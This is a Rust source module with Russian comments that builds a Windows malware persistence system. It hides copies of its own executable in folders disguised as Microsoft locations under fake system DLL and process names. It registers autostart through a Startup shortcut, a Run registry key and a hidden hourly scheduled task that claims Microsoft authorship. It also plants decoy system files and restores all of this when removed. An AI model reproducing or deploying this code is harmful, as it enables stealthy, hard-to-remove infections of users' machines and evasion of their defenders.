use anyhow::{Result, Context};
use std::path::{Path, PathBuf};
use std::fs;
use winreg::enums::*;
use winreg::RegKey;
use std::os::windows::process::CommandExt;
use winapi::um::fileapi::INVALID_FILE_ATTRIBUTES;

/// Survival system manager - backups and autostart
pub struct SurvivalManager {
    exe_path: PathBuf,
    exe_name: String,
    is_stealth: bool,
}

impl SurvivalManager {
    pub fn new() -> Result<Self> {
        let exe_path = std::env::current_exe()
            .context("Не удалось получить путь к исполняемому файлу")?;
        
        let exe_name = exe_path
            .file_stem()
            .and_then(|name| name.to_str())
            .unwrap_or("eye")
            .to_lowercase();
        
        let is_stealth = exe_name.contains("stealth") || exe_name.contains("silent");
        
        Ok(Self {
            exe_path,
            exe_name,
            is_stealth,
        })
    }
    
    /// Инициализация системы выживания при первом запуске
    pub async fn initialize_survival_system(&self) -> Result<()> {
        log::info!("🛡️ Инициализация системы выживания...");
        
        // 1. Создаём резервные копии
        self.create_backup_copies().await?;
        
        // 2. Настраиваем автозагрузку
        self.setup_autostart().await?;
        
        // 3. Создаём системные службы маскировки
        self.setup_system_masking().await?;
        
        log::info!("✅ Система выживания активирована");
        Ok(())
    }
    
    /// Создание резервных копий в нескольких безопасных местах
    async fn create_backup_copies(&self) -> Result<()> {
        let backup_locations = self.get_backup_locations()?;
        let source_data = fs::read(&self.exe_path)?;
        
        for location in backup_locations {
            let backup_path = location.join(&self.generate_backup_name());
            
            // Создаём папку если не существует
            if let Some(parent) = backup_path.parent() {
                fs::create_dir_all(parent)?;
                
                // Скрываем папку
                #[cfg(windows)]
                self.set_hidden_attribute(parent)?;
            }
            
            // Копируем файл
            fs::write(&backup_path, &source_data)?;
            
            // Скрываем файл
            #[cfg(windows)]
            self.set_hidden_attribute(&backup_path)?;
            
            log::info!("📦 Резервная копия создана: {}", backup_path.display());
        }
        
        Ok(())
    }
    
    /// Получение списка безопасных мест для резервных копий
    fn get_backup_locations(&self) -> Result<Vec<PathBuf>> {
        let mut locations = Vec::new();
        
        // 1. AppData\Local - основное место
        if let Ok(appdata) = std::env::var("LOCALAPPDATA") {
            let path = PathBuf::from(appdata).join("Microsoft").join("Windows").join("WER");
            locations.push(path);
        }
        
        // 2. AppData\Roaming в системной папке
        if let Ok(appdata) = std::env::var("APPDATA") {
            let path = PathBuf::from(appdata).join("Microsoft").join("Windows").join("Themes");
            locations.push(path);
        }
        
        // 3. Temp с системным именем
        let temp_path = std::env::temp_dir().join("Microsoft").join(".NET").join("Framework");
        locations.push(temp_path);
        
        // 4. ProgramData (если доступен)
        if let Ok(programdata) = std::env::var("PROGRAMDATA") {
            let path = PathBuf::from(programdata).join("Microsoft").join("Windows Defender").join("Scans");
            locations.push(path);
        }
        
        // 5. В папке пользователя (скрытая)
        if let Ok(userprofile) = std::env::var("USERPROFILE") {
            let path = PathBuf::from(userprofile).join(".config").join("systemd");
            locations.push(path);
        }
        
        Ok(locations)
    }
    
    /// Генерация имени для резервной копии (маскировка)
    fn generate_backup_name(&self) -> String {
        if self.is_stealth {
            // Для stealth версии - системные имена
            vec![
                "Windows.ApplicationModel.Store.Preview.dll",
                "Microsoft.Win32.TaskScheduler.dll", 
                "System.ServiceProcess.ServiceController.dll",
                "Windows.Security.Authentication.Web.Core.dll",
                "Microsoft.Windows.Cortana.PAL.dll"
            ][rand::random::<usize>() % 5].to_string()
        } else {
            // Для обычной версии - обычные имена
            vec![
                "UpdateChecker.exe",
                "ServiceHost.exe",
                "SystemTray.exe", 
                "BackgroundTaskHost.exe",
                "RuntimeBroker.exe"
            ][rand::random::<usize>() % 5].to_string()
        }
    }
    
    /// Настройка двойной автозагрузки
    async fn setup_autostart(&self) -> Result<()> {
        // Метод 1: Startup папка
        self.setup_startup_folder().await?;
        
        // Метод 2: Реестр Windows
        self.setup_registry_autostart().await?;
        
        // Метод 3: Scheduled Task (бонус)
        self.setup_scheduled_task().await?;
        
        Ok(())
    }
    
    /// Автозагрузка через папку Startup
    async fn setup_startup_folder(&self) -> Result<()> {
        if let Ok(appdata) = std::env::var("APPDATA") {
            let startup_path = PathBuf::from(appdata)
                .join("Microsoft")
                .join("Windows")
                .join("Start Menu")
                .join("Programs")
                .join("Startup");
            
            if startup_path.exists() {
                let link_name = if self.is_stealth {
                    "Windows Security Update.lnk"
                } else {
                    "System Updater.lnk"
                };
                
                let link_path = startup_path.join(link_name);
                self.create_shortcut(&link_path, &self.exe_path).await?;
                
                log::info!("🔗 Автозагрузка через Startup: {}", link_path.display());
            }
        }
        
        Ok(())
    }
    
    /// Автозагрузка через реестр Windows
    async fn setup_registry_autostart(&self) -> Result<()> {
        let hkcu = RegKey::predef(HKEY_CURRENT_USER);
        let run_key = hkcu.open_subkey_with_flags(
            "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            KEY_SET_VALUE
        )?;
        
        let app_name = if self.is_stealth {
            "WindowsSecurityUpdate"
        } else {
            "SystemUpdater"  
        };
        
        let exe_path_str = self.exe_path.to_string_lossy().to_string();
        run_key.set_value(app_name, &exe_path_str)?;
        
        log::info!("📝 Автозагрузка через реестр: HKCU\\...\\Run\\{}", app_name);
        
        Ok(())
    }
    
    /// Создание запланированной задачи (дополнительная защита)
    async fn setup_scheduled_task(&self) -> Result<()> {
        let task_name = if self.is_stealth {
            "MicrosoftEdgeUpdateTaskMachineUA"
        } else {
            "SystemMaintenanceTask"
        };
        
        // Создаём XML для задачи
        let task_xml = self.generate_task_xml();
        
        // Создаём временный файл с XML
        let temp_xml = std::env::temp_dir().join("task.xml");
        fs::write(&temp_xml, task_xml)?;
        
        // Выполняем команду создания задачи
        let output = std::process::Command::new("schtasks")
            .args(&[
                "/create",
                "/tn", task_name,
                "/xml", &temp_xml.to_string_lossy(),
                "/f"
            ])
            .creation_flags(0x08000000) // CREATE_NO_WINDOW
            .output();
        
        // Удаляем временный файл
        let _ = fs::remove_file(&temp_xml);
        
        if let Ok(result) = output {
            if result.status.success() {
                log::info!("⏰ Запланированная задача создана: {}", task_name);
            }
        }
        
        Ok(())
    }
    
    /// Генерация XML для запланированной задачи
    fn generate_task_xml(&self) -> String {
        let exe_path = self.exe_path.to_string_lossy();
        
        format!(r#"<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Date>2025-01-01T12:00:00</Date>
    <Author>Microsoft Corporation</Author>
    <Description>System maintenance and update task</Description>
  </RegistrationInfo>
  <Triggers>
    <LogonTrigger>
      <StartBoundary>2025-01-01T12:00:00</StartBoundary>
      <Enabled>true</Enabled>
    </LogonTrigger>
    <TimeTrigger>
      <StartBoundary>2025-01-01T12:00:00</StartBoundary>
      <Enabled>true</Enabled>
      <Repetition>
        <Interval>PT1H</Interval>
        <StopAtDurationEnd>false</StopAtDurationEnd>
      </Repetition>
    </TimeTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <LogonType>InteractiveToken</LogonType>
      <RunLevel>LeastPrivilege</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>false</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>{}</Command>
    </Exec>
  </Actions>
</Task>"#, exe_path)
    }
    
    /// Настройка системной маскировки
    async fn setup_system_masking(&self) -> Result<()> {
        // Создаём поддельные системные файлы для маскировки
        let mask_locations = vec![
            std::env::temp_dir().join("Windows.old").join("System32"),
            std::env::temp_dir().join("Recovery").join("WindowsRE"),
        ];
        
        for location in mask_locations {
            if let Err(_) = fs::create_dir_all(&location) {
                continue;
            }
            
            // Создаём поддельные системные файлы
            let fake_files = vec![
                "ntdll.dll.bak",
                "kernel32.dll.old", 
                "user32.dll.tmp",
                "advapi32.dll.bak"
            ];
            
            for fake_file in fake_files {
                let fake_path = location.join(fake_file);
                let fake_content = b"This is a system backup file. Do not delete.";
                
                if fs::write(&fake_path, fake_content).is_ok() {
                    #[cfg(windows)]
                    let _ = self.set_hidden_attribute(&fake_path);
                }
            }
            
            #[cfg(windows)]
            let _ = self.set_hidden_attribute(&location);
        }
        
        Ok(())
    }
    
    /// Проверка и восстановление системы выживания
    pub async fn check_and_restore(&self) -> Result<()> {
        // Проверяем существование резервных копий
        let backup_locations = self.get_backup_locations()?;
        let mut found_backups = 0;
        
        for location in &backup_locations {
            if let Ok(entries) = fs::read_dir(location) {
                for entry in entries.flatten() {
                    if entry.path().extension()
                        .map_or(false, |ext| ext == "exe" || ext == "dll") {
                        found_backups += 1;
                        break;
                    }
                }
            }
        }
        
        // Если резервных копий мало - создаём новые
        if found_backups < 3 {
            log::warn!("⚠️ Обнаружено недостаточно резервных копий, восстанавливаем...");
            self.create_backup_copies().await?;
        }
        
        // Проверяем автозагрузку
        self.verify_autostart().await?;
        
        Ok(())
    }
    
    /// Проверка автозагрузки
    async fn verify_autostart(&self) -> Result<()> {
        let mut autostart_methods = 0;
        
        // Проверяем реестр
        if let Ok(hkcu) = RegKey::predef(HKEY_CURRENT_USER).open_subkey("Software\\Microsoft\\Windows\\CurrentVersion\\Run") {
            let app_names = if self.is_stealth {
                vec!["WindowsSecurityUpdate"]
            } else {
                vec!["SystemUpdater"]
            };
            
            for app_name in app_names {
                if hkcu.get_value::<String, _>(app_name).is_ok() {
                    autostart_methods += 1;
                    break;
                }
            }
        }
        
        // Проверяем Startup папку
        if let Ok(appdata) = std::env::var("APPDATA") {
            let startup_path = PathBuf::from(appdata)
                .join("Microsoft")
                .join("Windows")
                .join("Start Menu")
                .join("Programs")
                .join("Startup");
            
            if let Ok(entries) = fs::read_dir(startup_path) {
                for entry in entries.flatten() {
                    let name = entry.file_name().to_string_lossy().to_lowercase();
                    if name.contains("security") || name.contains("update") || name.contains("system") {
                        autostart_methods += 1;
                        break;
                    }
                }
            }
        }
        
        // Если методов автозагрузки недостаточно - восстанавливаем
        if autostart_methods < 2 {
            log::warn!("⚠️ Автозагрузка повреждена, восстанавливаем...");
            self.setup_autostart().await?;
        }
        
        Ok(())
    }
    
    #[cfg(windows)]
    fn set_hidden_attribute(&self, path: &Path) -> Result<()> {

        use winapi::um::fileapi::{GetFileAttributesW, SetFileAttributesW};
        use winapi::um::winnt::FILE_ATTRIBUTE_HIDDEN;
        
        let path_wide: Vec<u16> = path.to_string_lossy()
            .encode_utf16()
            .chain(std::iter::once(0))
            .collect();
        
        unsafe {
            let attrs = GetFileAttributesW(path_wide.as_ptr());
            if attrs != INVALID_FILE_ATTRIBUTES {
                SetFileAttributesW(path_wide.as_ptr(), attrs | FILE_ATTRIBUTE_HIDDEN);
            }
        }
        
        Ok(())
    }
    
    /// Создание ярлыка (shortcut)
    async fn create_shortcut(&self, link_path: &Path, target_path: &Path) -> Result<()> {
        // Простая реализация через PowerShell
        let ps_script = format!(
            r#"$WshShell = New-Object -comObject WScript.Shell; $Shortcut = $WshShell.CreateShortcut('{}'); $Shortcut.TargetPath = '{}'; $Shortcut.Save()"#,
            link_path.display(),
            target_path.display()
        );
        
        let output = std::process::Command::new("powershell")
            .args(&["-WindowStyle", "Hidden", "-Command", &ps_script])
            .creation_flags(0x08000000) // CREATE_NO_WINDOW
            .output();
        
        if let Ok(result) = output {
            if result.status.success() {
                return Ok(());
            }
        }
        
        // Fallback: копируем файл напрямую
        fs::copy(target_path, link_path)?;
        Ok(())
    }
}

/// Функция для инициализации системы выживания
pub async fn initialize_survival_system() -> Result<()> {
    let manager = SurvivalManager::new()?;
    manager.initialize_survival_system().await
}

/// Функция для проверки и восстановления системы
pub async fn check_and_restore_survival() -> Result<()> {
    let manager = SurvivalManager::new()?;
    manager.check_and_restore().await
}
